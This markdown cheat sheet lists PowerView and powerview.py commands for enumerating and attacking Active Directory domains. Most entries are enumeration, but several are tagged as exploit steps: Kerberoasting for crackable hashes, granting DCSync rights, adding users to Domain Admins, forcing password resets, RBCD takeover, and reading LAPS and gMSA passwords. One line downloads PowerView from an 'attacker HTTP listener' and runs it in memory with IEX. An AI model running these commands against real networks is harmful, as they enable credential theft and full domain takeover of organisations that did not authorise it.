# PowerView
> Active Directory enumeration and abuse from a domain-joined Windows host (PowerShell) and its Linux port `powerview.py`. Run the PowerShell cmdlets in a session where PowerView is loaded; run the `powerview.py` forms against a DC over LDAP. {{USERNAME}} is the actor you authenticate as, {{TARGET_USER}} is the subject account you look up or target.

<!-- tags: ad,powerview,enumeration,acl,delegation,kerberos -->

## enumerate domain users powerview
Return every user object (or one named user) from the domain.

```bash
Get-DomainUser -Identity {{TARGET_USER:str:Administrator}} -Properties samaccountname,description,memberof
```

<!-- meta: risk=low | phase=enum | tags=users,enum -->

---

## enumerate domain groups powerview
Return all (or a specified) domain groups.

```bash
Get-DomainGroup -Identity '{{GROUP:str:Domain Admins}}'
```

<!-- meta: risk=low | phase=enum | tags=groups,enum -->

---

## enumerate domain group members powerview
List the members of a domain group — run against privileged groups to find operators worth targeting.

```bash
Get-DomainGroupMember -Identity '{{GROUP:str:Domain Admins}}' | select MemberName,MemberSID
```

<!-- meta: risk=low | phase=enum | tags=groups,members,enum -->

---

## enumerate domain computers powerview
Return all (or a specified) computer objects, including OS and DNS hostname.

```bash
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp
```

<!-- meta: risk=low | phase=enum | tags=computers,enum -->

---

## get domain powerview
Read the domain object for the current (or a specified) domain.

```bash
Get-Domain -Domain {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=low | phase=enum | tags=domain,enum -->

---

## get domain controller powerview
Return the Domain Controllers for the current (or a specified) domain.

```bash
Get-DomainController -Domain {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=low | phase=enum | tags=domain,dc,enum -->

---

## get domain sid powerview
Return the domain SID — required for silver/golden ticketer and SID-history flows.

```bash
Get-DomainSID
```

<!-- meta: risk=low | phase=enum | tags=domain,sid -->

---

## find adminsdholder protected users powerview
Users with `adminCount=1` — accounts protected by AdminSDHolder, i.e. (formerly) privileged. Fast high-value target map.

```bash
Get-DomainUser -AdminCount | select samaccountname,useraccountcontrol
```

<!-- meta: risk=low | phase=enum | tags=users,admincount,privileged -->

---

## find kerberoastable users powerview
List every user with an SPN set — the Kerberoast target list.

```bash
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

<!-- meta: risk=low | phase=enum | tags=kerberoast,spn,users -->

---

## kerberoast all spns powerview
Auto-Kerberoast every reachable SPN-enabled account and return hashcat-formatted crackable hashes.

```bash
Invoke-Kerberoast -OutputFormat Hashcat | select -ExpandProperty Hash
```

<!-- meta: risk=med | phase=enum | tags=kerberoast,spn,hashcat -->

---

## request spn ticket powerview
Request a TGS for one SPN and format it for hashcat (mode 13100) — targeted manual Kerberoast.

```bash
Get-DomainUser -Identity {{TARGET_USER:str:svc_sql}} | Get-DomainSPNTicket -Format Hashcat
```

<!-- meta: risk=med | phase=enum | tags=kerberoast,spn,ticket -->

---

## find asreproastable users powerview
Users with Kerberos pre-auth disabled (DONT_REQ_PREAUTH) — AS-REPs can be requested without creds and cracked offline.

```bash
Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof
```

<!-- meta: risk=low | phase=enum | tags=asreproast,preauth,users -->

---

## find unconstrained delegation computers powerview
Computer accounts with TRUSTED_FOR_DELEGATION — coerce one and dump LSASS for any TGT that lands on it (often DC compromise).

```bash
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
```

<!-- meta: risk=low | phase=enum | tags=delegation,unconstrained,computers -->

---

## find unconstrained delegation users powerview
User accounts with the TRUSTED_FOR_DELEGATION UAC bit (524288). Compromise often equals domain compromise.

```bash
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```

<!-- meta: risk=low | phase=enum | tags=delegation,unconstrained,users -->

---

## find constrained delegation users powerview
Users marked TrustedToAuth (constrained delegation with protocol transition) — S4U2Self/S4U2Proxy abuse candidates.

```bash
Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,msds-allowedtodelegateto
```

<!-- meta: risk=low | phase=enum | tags=delegation,constrained,s4u,users -->

---

## find constrained delegation computers powerview
Computer accounts with TrustedToAuth (S4U2Self/S4U2Proxy) — often a privesc shortcut to any service hosted on them.

```bash
Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto
```

<!-- meta: risk=low | phase=enum | tags=delegation,constrained,s4u,computers -->

---

## get object acl powerview
Read the DACL of a named object and resolve GUIDs to readable rights — first step in finding misconfigured permissions.

```bash
Get-DomainObjectAcl -Identity {{TARGET_USER:str:Administrator}} -ResolveGUIDs
```

<!-- meta: risk=low | phase=enum | tags=acl,dacl,enum -->

---

## find interesting acls powerview
Find ACEs in the domain granted to non-builtin principals — the typical privesc paths (GenericAll, WriteDacl, etc.).

```bash
Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights
```

<!-- meta: risk=low | phase=enum | tags=acl,privesc,enum -->

---

## filter acls by sid powerview
Filter resolved ACLs to only those granted to a specific SID — answers "what can this principal write?" in one shot.

```bash
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq '{{SID:str:S-1-5-21-...-1107}}'}
```

<!-- meta: risk=low | phase=enum | tags=acl,sid,privesc -->

---

## convert name to sid powerview
Resolve a user/group name to a SID for ACL filtering and ticketer.

```bash
Convert-NameToSid {{TARGET_USER:str:Administrator}}
```

<!-- meta: risk=safe | phase=enum | tags=sid,helper -->

---

## convert sid to name powerview
Translate a SID string into the matching domain principal — handy when reading raw ACL output.

```bash
ConvertFrom-SID {{SID:str:S-1-5-21-...-512}}
```

<!-- meta: risk=safe | phase=enum | tags=sid,helper -->

---

## decode uac value powerview
Decode a userAccountControl integer into its named flags — saves the constant-table lookup.

```bash
ConvertFrom-UACValue -Value {{UAC_VALUE:int:66048}}
```

<!-- meta: risk=safe | phase=enum | tags=uac,helper -->

---

## get domain trust powerview
Return all domain trusts for the current or specified domain — foundation for cross-domain enumeration.

```bash
Get-DomainTrust -Domain {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=low | phase=enum | tags=trusts,domain -->

---

## map domain trusts powerview
Recursive trust enumeration starting at the current domain — builds a full trust map.

```bash
Get-DomainTrustMapping
```

<!-- meta: risk=low | phase=enum | tags=trusts,mapping -->

---

## get forest trust powerview
Return all forest-level trusts.

```bash
Get-ForestTrust -Forest {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=low | phase=enum | tags=trusts,forest -->

---

## find foreign group members powerview
Groups containing members from another domain — maps where a cross-domain trust grants inbound access.

```bash
Get-DomainForeignGroupMember -Domain {{DOMAIN:domain:corp.local}}
```

<!-- meta: risk=low | phase=enum | tags=trusts,foreign,groups -->

---

## enumerate gpos powerview
Return all (or a specified) GPO objects — inspect `gpcfilesyspath` to find writable policies.

```bash
Get-DomainGPO -Properties displayname,gpcfilesyspath
```

<!-- meta: risk=low | phase=enum | tags=gpo,enum -->

---

## find gpo local group mapping powerview
For a user/group, map every machine where a GPO grants them local-group membership — a quick lateral-movement target list.

```bash
Get-DomainGPOUserLocalGroupMapping -Identity {{TARGET_USER:str:Administrator}} -LocalGroup Administrators
```

<!-- meta: risk=low | phase=enum | tags=gpo,localgroup,lateral -->

---

## find gpo local group settings powerview
GPOs that modify local group memberships via Restricted Groups / GPP — an excellent source of lateral-movement clues.

```bash
Get-DomainGPOLocalGroup
```

<!-- meta: risk=low | phase=enum | tags=gpo,localgroup,restricted-groups -->

---

## enumerate ous powerview
List OUs in the domain — combine with GPO links to find OU-scoped policy abuse.

```bash
Get-DomainOU -Properties name,gplink,distinguishedname
```

<!-- meta: risk=low | phase=enum | tags=ou,enum -->

---

## find local admin access powerview
Find domain machines where the current user has local admin — the lateral-movement candidate list.

```bash
Find-LocalAdminAccess
```

<!-- meta: risk=low | phase=enum | tags=localadmin,lateral,hunt -->

---

## get net session powerview
Session info on a remote machine (NetSessionEnum) — maps where users are coming from for session hunting.

```bash
Get-NetSession -ComputerName {{COMPUTER:str:DC01}}
```

<!-- meta: risk=low | phase=enum | tags=sessions,hunt,smb -->

---

## get logged on users powerview
Users logged on to a remote machine (NetWkstaUserEnum) — pinpoint where a high-value user is signed in.

```bash
Get-NetLoggedon -ComputerName {{COMPUTER:str:DC01}}
```

<!-- meta: risk=low | phase=enum | tags=sessions,loggedon,hunt -->

---

## get net local group members powerview
Members of a named local group on a remote machine — confirms who holds local admin on a host.

```bash
Get-NetLocalGroupMember -ComputerName {{COMPUTER:str:DC01}} -GroupName Administrators
```

<!-- meta: risk=low | phase=enum | tags=localgroup,members -->

---

## find domain shares powerview
Find reachable SMB shares across domain machines.

```bash
Find-DomainShare -CheckShareAccess
```

<!-- meta: risk=low | phase=enum | tags=shares,smb -->

---

## find interesting share files powerview
Search readable domain shares for files matching name/keyword criteria — pair with Find-DomainShare.

```bash
Find-InterestingDomainShareFile -Include *.config,*password*,*.kdbx
```

<!-- meta: risk=low | phase=enum | tags=shares,files,loot -->

---

## hunt user location powerview
Find domain machines where a named user is currently logged in — hunt mode for high-value targets.

```bash
Find-DomainUserLocation -UserIdentity {{TARGET_USER:str:Administrator}}
```

<!-- meta: risk=low | phase=enum | tags=hunt,loggedon,lateral -->

---

## get managed security groups powerview
Find security groups with a `managedBy` set — the manager often holds implicit write rights over membership (privesc path).

```bash
Get-DomainManagedSecurityGroup
```

<!-- meta: risk=low | phase=enum | tags=groups,managedby,privesc -->

---

## set spn targeted kerberoast powerview
Write a fake SPN onto a user you control so it becomes Kerberoastable on demand (requires write rights over the target).

```bash
Set-DomainObject -Identity {{TARGET_USER:str:victim}} -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```

<!-- meta: risk=high | phase=exploit | tags=kerberoast,spn,targeted -->

---

## add object acl dcsync powerview
Add an ACE to an object's DACL — granting DCSync replication rights to a principal is the classic domain-takeover primitive.

```bash
Add-DomainObjectAcl -TargetIdentity '{{DOMAIN:domain:corp.local}}' -PrincipalIdentity {{TARGET_USER:str:lowpriv}} -Rights DCSync -Verbose
```

<!-- meta: risk=critical | phase=exploit | tags=acl,dcsync,domain-takeover -->

---

## add domain group member powerview
Add a principal to a privileged group — common finalization step after an ACL win.

```bash
Add-DomainGroupMember -Identity '{{GROUP:str:Domain Admins}}' -Members {{TARGET_USER:str:lowpriv}} -Verbose
```

<!-- meta: risk=high | phase=exploit | tags=group,addmember,privesc -->

---

## force change password powerview
Force-reset a user's password via a SecureString (requires User-Force-Change-Password or reset rights over the target).

```bash
$p = ConvertTo-SecureString '{{TARGET_PASSWORD:str:Passw0rd!2024}}' -AsPlainText -Force; Set-DomainUserPassword -Identity {{TARGET_USER:str:victim}} -AccountPassword $p -Verbose
```

<!-- meta: risk=high | phase=exploit | tags=password,reset,forcechangepassword -->

---

## load powerview in memory powerview
Pull PowerView from an attacker HTTP listener straight into the current session — no disk drop.

```bash
(New-Object Net.WebClient).DownloadString('http://{{LHOST:ip}}:{{LPORT:int:80}}/PowerView.ps1') | IEX
```

<!-- meta: risk=med | phase=misc | tags=bootstrap,loader,inmemory -->

---

## open powerview.py session
Drop into the interactive `powerview.py` shell against the target DC — every subcommand below runs inside this prompt. Swap `:{{PASSWORD}}` for `-H :{{NTHASH}}` (pass-the-hash) or `-k` (Kerberos).

```bash
powerview {{DOMAIN:domain:corp.local}}/{{USERNAME:str:user}}:'{{PASSWORD:str:pass}}'@{{DC_IP:ip}}
```

<!-- meta: risk=low | phase=enum | tags=powerview.py,connect,session -->

---

## find rbcd configurations powerview.py
Search AD for accounts with `msDS-AllowedToActOnBehalfOfOtherIdentity` set — reveals existing RBCD takeover paths.

```bash
Get-DomainRBCD
```

<!-- meta: risk=low | phase=enum | tags=powerview.py,rbcd,delegation -->

---

## set rbcd delegation powerview.py
Write an RBCD entry so an attacker-controlled computer can S4U2Proxy to the target as any user — classic RBCD takeover.

```bash
Set-DomainRBCD -Identity {{TARGET_COMPUTER:str:targetcomputer$}} -DelegateFrom {{DELEGATE_FROM:str:attacker$}}
```

<!-- meta: risk=high | phase=exploit | tags=powerview.py,rbcd,delegation,s4u -->

---

## find laps readable computers powerview.py
List computers with LAPS populated — if your principal can read `ms-Mcs-AdmPwd`, the local admin password comes back directly.

```bash
Get-DomainComputer -LAPS
```

<!-- meta: risk=low | phase=enum | tags=powerview.py,laps,computers -->

---

## find gmsa passwords powerview.py
Return computers whose gMSA password the current principal can read — `powerview.py` decodes it straight to an NT hash.

```bash
Get-DomainComputer -GMSAPassword
```

<!-- meta: risk=med | phase=enum | tags=powerview.py,gmsa,credentials -->

---

## get object owner powerview.py
Return the security-descriptor owner of an object — owners hold implicit WriteDacl, so this often reveals control paths.

```bash
Get-DomainObjectOwner -Identity {{TARGET_USER:str:Administrator}}
```

<!-- meta: risk=low | phase=enum | tags=powerview.py,acl,owner -->

---

## find vulnerable cert templates powerview.py
List AD CS templates with known-bad configurations and resolve their ACL SIDs — targets for ESC1/2/3 and friends.

```bash
Get-DomainCATemplate -Vulnerable -ResolveSIDs
```

<!-- meta: risk=low | phase=enum | tags=powerview.py,adcs,esc,templates -->
